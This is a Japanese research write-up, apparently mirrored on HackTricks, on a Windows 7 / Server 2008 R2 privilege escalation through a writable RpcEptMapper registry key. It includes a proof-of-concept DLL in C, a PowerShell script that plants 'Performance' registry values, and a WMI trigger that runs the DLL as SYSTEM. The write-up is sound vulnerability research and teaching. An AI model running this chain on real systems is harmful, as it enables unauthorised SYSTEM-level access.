<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


**情報はここからコピー** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

スクリプトの出力によると、現在のユーザーは2つのレジストリキーに対していくつかの書き込み権限を持っています。

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

`regedit` GUIを使用して、`RpcEptMapper`サービスの権限を手動で確認しましょう。私が本当に気に入っているのは、_Advanced Security Settings_ウィンドウの_Effective Permissions_タブです。任意のユーザーまたはグループ名を選択すると、個別にすべてのACEを調査する必要なく、この主体に付与された有効な権限がすぐに表示されます。次のスクリーンショットは、低特権の`lab-user`アカウントの結果を示しています。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

ほとんどの権限は標準です（例：`Query Value`）が、特に1つが目立ちます：`Create Subkey`。この権限に対応する一般的な名前は`AppendData/AddSubdirectory`であり、スクリプトで報告された内容とまったく同じです。
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
これは正確に何を意味していますか？これは、たとえば`ImagePath`の値を変更することはできないということを意味しています。そのためには、`WriteData/AddFile`の許可が必要です。代わりに、新しいサブキーの作成のみが可能です。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03_registry-imagepath-access-denied.png)

これは本当に誤検知だったのでしょうか？確かにそうではありません。楽しみましょう！

## RTFM <a href="#rtfm" id="rtfm"></a>

この時点で、`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`の下に任意のサブキーを作成できることはわかっていますが、既存のサブキーと値を変更することはできません。これらの既存のサブキーは、`Parameters`と`Security`であり、Windowsサービスには一般的なものです。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04_registry-rpceptmapper-config.png)

したがって、最初に思い浮かんだ質問は次のとおりです:「`Parameters`や`Security`のような、効果的にサービスの構成を変更し、動作を変更するために利用できる他の事前定義されたサブキーはあるのでしょうか？」

この質問に答えるために、最初の計画はすべての既存のキーを列挙し、パターンを特定することでした。アイデアは、サービスの構成にとって「意味のある」サブキーを見ることでした。これをPowerShellで実装し、結果をソートすることができるかどうか考え始めました。しかし、それを行う前に、このレジストリ構造が既に文書化されているかどうか疑問に思いました。そのため、`windows service configuration registry site:microsoft.com`のようなキーワードでGoogle検索を行い、最初の[結果](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)が表示されました。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05_google-search-registry-services.png)

有望ですね。一見すると、ドキュメントは完全ではないように思えました。タイトルを考慮すると、サービスの構成を定義するすべてのサブキーと値を詳細に説明したツリー構造が表示されることを期待していましたが、明らかにそこにはありませんでした。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06_doc-registry-services.png)

それでも、各段落をざっと見てみました。そして、「_**Performance**_」と「_**DLL**_」というキーワードにすぐに気付きました。「**Perfomance**」の小見出しの下では、次のように説明されています。

> **Performance**: _オプションのパフォーマンスモニタリングの情報を指定するキーです。このキーの値は、**ドライバのパフォーマンスDLLの名前**と、そのDLLの**特定のエクスポートされた関数の名前**を指定します。ドライバのINFファイルのAddRegエントリを使用して、このサブキーに値エントリを追加できます。_

この短い段落によると、`Performance`サブキーを使用して、ドライバサービスにDLLを登録してパフォーマンスを監視することが理論的に可能です。**これは非常に興味深いです！** このキーは`RpcEptMapper`サービスのデフォルトでは存在しないので、まさに必要なもののようです。ただし、このサービスは明らかにドライバサービスではありません。とにかく、試してみる価値はありますが、「_パフォーマンスモニタリング_」機能についてのさらなる情報が必要です。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07_sc-qc-rpceptmapper.png)

> **注意:** Windowsでは、各サービスには特定の`Type`があります。サービスのタイプは次の値のいずれかであることがあります: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)`または`SERVICE_INTERACTIVE_PROCESS (256)`。

Google検索をしていくつかの情報を見つけました。ドキュメントには、[Creating the Application’s Performance Key](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)というリソースがあります。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08_performance-subkey-documentation.png)

まず、作成する必要のあるすべてのキーと値がリストアップされた素敵なツリー構造があります。その後、説明では次のようなキー情報が与えられています。

* `Library`の値には、**DLLの名前またはDLLへの完全なパス**を指定できます。
* `Open`、`Collect`、`Close`の値を使用して、DLLがエクスポートする関数の名前を指定できます。
* これらの値のデータ型は`REG_SZ`です（`Library`の値の場合は`REG_EXPAND_SZ`です）。

このリソースに含まれているリンクをたどると、これらの関数のプロトタイプといくつかのコードサンプルが見つかります: [Implementing OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata)。
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
## Proof-of-Conceptの作成 <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

ドキュメント全体から収集したビットとピースのおかげで、シンプルなProof-of-Concept DLLを作成することは非常に簡単です。しかし、それでも計画が必要です！

DLLハイジャックの脆弱性を悪用する必要がある場合、通常はシンプルでカスタムなログヘルパー関数から始めます。この関数の目的は、呼び出されるたびにいくつかの重要な情報をファイルに書き込むことです。通常、現在のプロセスと親プロセスのPID、プロセスを実行しているユーザーの名前、対応するコマンドラインをログに記録します。また、このログイベントをトリガーした関数の名前も記録します。これにより、どのコードの部分が実行されたかがわかります。

他の記事では、開発部分を省略していましたが、それはほぼ明らかだと思っていました。しかし、私のブログ投稿は初心者にも分かりやすいものにしたいと思っているので、矛盾があります。ここではこの状況を解消するために、プロセスの詳細な説明を行います。では、Visual Studioを起動して新しい「_C++ Console App_」プロジェクトを作成しましょう。注意点として、「_Dynamic-Link Library (DLL)_」プロジェクトを作成することもできますが、実際にはコンソールアプリから始める方が簡単だと思います。

以下は、Visual Studioによって生成された初期コードです：
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
もちろん、それは私たちが望むものではありません。私たちはDLLを作成したいので、`main`関数を`DllMain`に置き換える必要があります。この関数のスケルトンコードはドキュメントで見つけることができます：[DLLの初期化](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)。
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
同時に、プロジェクトの設定を変更して、コンパイルされた出力ファイルがEXEではなくDLLであることを指定する必要があります。これを行うには、プロジェクトのプロパティを開き、「**一般**」セクションで「**動的ライブラリ (.dll)**」を「**構成の種類**」として選択します。タイトルバーのすぐ下にある「**すべての構成**」と「**すべてのプラットフォーム**」も選択して、この設定をグローバルに適用できるようにします。

次に、カスタムのログヘルパー関数を追加します。
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
次に、私たちはDLLにドキュメントで見た3つの関数を追加します。ドキュメントには、成功した場合に`ERROR_SUCCESS`を返すべきだとも記載されています。
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
Ok、プロジェクトは正しく設定されました。`DllMain`が実装され、ログヘルパー関数と必要な3つの関数があります。ただし、最後に1つだけ不足しています。このコードをコンパイルすると、`OpenPerfData`、`CollectPerfData`、`ClosePerfData`は内部関数としてのみ利用可能になるため、**エクスポート**する必要があります。これはいくつかの方法で実現できます。たとえば、[DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files)ファイルを作成し、プロジェクトを適切に設定することができます。ただし、私は特にこのような小さなプロジェクトでは、`__declspec(dllexport)`キーワード（[doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)）を使用することを好みます。この方法では、ソースコードの先頭で3つの関数を宣言するだけで済みます。
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
完全なコードを見たい場合は、[こちら](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12)にアップロードしました。

最後に、_**Release/x64**_ を選択し、「_**ソリューションをビルド**_」します。これにより、次のDLLファイルが生成されます：`.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`。

## PoCのテスト <a href="#testing-the-poc" id="testing-the-poc"></a>

さらに進む前に、ペイロードが正常に動作していることを常に確認するために、別々にテストすることをお勧めします。ここで少し時間をかけることで、仮想的なデバッグフェーズ中に迷路に迷い込むことを防ぐため、後で多くの時間を節約できます。そのために、単純に`rundll32.exe`を使用し、DLLの名前とエクスポートされた関数の名前をパラメータとして渡すことができます。
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/09\_test-poc-rundll32.gif)

素晴らしい、ログファイルが作成されました。開いてみると、2つのエントリが表示されます。最初のエントリは、`rundll32.exe`によってDLLがロードされたときに書き込まれました。2番目のエントリは、`OpenPerfData`が呼び出されたときに書き込まれました。うまくいっていますね！😊
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
よし、では実際の脆弱性に焦点を当てて、必要なレジストリキーと値の作成を始めましょう。これは、`reg.exe` / `regedit.exe`を使用して手動で行うか、スクリプトを使用してプログラム的に行うことができます。初期の調査中に手動で手順を実行したので、同じことをより簡潔に行うPowerShellスクリプトを示します。また、PowerShellでレジストリキーと値を作成するのは、`New-Item`と`New-ItemProperty`を呼び出すだけですね。![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`要求されたレジストリ アクセスが許可されていません`... うーん、そうですか... 結局、そんなに簡単ではないようですね。![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

この問題についてはあまり調査していませんが、おそらく`New-Item`を呼び出すとき、`powershell.exe`は実際には親のレジストリキーをいくつかのフラグとともに開こうとしていて、それが私たちが持っていない権限に対応しているのかもしれません。

とにかく、組み込みのコマンドレットがうまくいかない場合は、常に1つ下のレベルに移動して、直接DotNet関数を呼び出すことができます。実際には、次のコードでレジストリキーもPowerShellで作成できます。
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/11\_powershell-dotnet-createsubkey.png)

さあ、始めましょう！最終的に、適切なキーと値を作成し、ユーザーの入力を待ち、最後にすべてをクリーンアップして終了するために、以下のスクリプトをまとめました。
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
最後のステップは、**RPCエンドポイントマッパーサービスをどのようにして私たちのパフォーマンスDLLを読み込ませるか**です。残念ながら、私は試したさまざまなことを追跡していません。このブログ記事の文脈では、研究がどれだけ手間と時間がかかることがあるかを強調することは非常に興味深いでしょう。とにかく、途中で見つけたことの一つは、WMI（Windows Management Instrumentation）を使用して_パフォーマンスカウンター_をクエリできることです。これはあまり驚くべきことではありません。詳細はこちら：[_WMIパフォーマンスカウンタータイプ_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types)。

> _カウンタータイプは、_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _クラスのプロパティのCounterType修飾子として表示され、_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _クラスのプロパティのCookingType修飾子として表示されます。_

したがって、最初に次のコマンドを使用して、PowerShellで_パフォーマンスデータ_に関連するWMIクラスを列挙しました。
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12\_powershell-get-wmiobject.gif)

そして、私はログファイルがほぼすぐに作成されたことに気付きました！以下はファイルの内容です。
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
予想では、最大でも`RpcEptMapper`サービスのコンテキストで`NETWORK SERVICE`として任意のコードを実行できると思っていましたが、予想以上の結果が得られました。実際には、`WMI`サービス自体のコンテキストで任意のコードを実行できました。このサービスは`LOCAL SYSTEM`として実行されています。素晴らしい結果ですね！ ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **注意:** もし`NETWORK SERVICE`として任意のコードを実行できた場合、数ヶ月前にJames Forshawがこのブログ記事でデモンストレーションしたトリックによって、`LOCAL SYSTEM`アカウントまであと一歩のところでした: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html)。

また、各WMIクラスを個別に試してみましたが、同じ結果が得られました。
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## 結論 <a href="#conclusion" id="conclusion"></a>

なぜこの脆弱性が長い間見逃されていたのかはわかりません。一つの説明としては、他のツールはおそらくレジストリでの完全な書き込みアクセスを探していたのに対し、この場合は`AppendData/AddSubdirectory`だけで十分だったからかもしれません。「誤構成」自体については、レジストリキーが特定の目的でこのように設定されていたと思われますが、具体的なシナリオでは、ユーザーがサービスの構成を変更する権限を持つことは考えられません。

この特権昇格の脆弱性について公開することを決めた理由は2つあります。最初の理由は、数ヶ月前に`GetModfiableRegistryPath`関数を使用してPrivescCheckスクリプトを更新した日に、実際に公開したからです（最初は気づかなかった）。2つ目の理由は、その影響が低いことです。これにはローカルアクセスが必要であり、サポートが終了した古いバージョンのWindowsにのみ影響を与えます（拡張サポートを購入している場合を除く）。この時点で、Windows 7 / Server 2008 R2をまだ適切にネットワーク内で分離せずに使用している場合、システム特権を取得する攻撃者を防ぐことはおそらく最も心配すべきことではないでしょう。

この特権昇格の脆弱性の逸話的な側面を除いて、この「Perfomance」レジストリ設定は、ポストエクスプロイト、横方向移動、AV/EDR回避に関して非常に興味深い機会を提供していると思います。すでにいくつかの具体的なシナリオを考えていますが、まだいずれもテストしていません。続く...。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**を**フォロー**してください**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
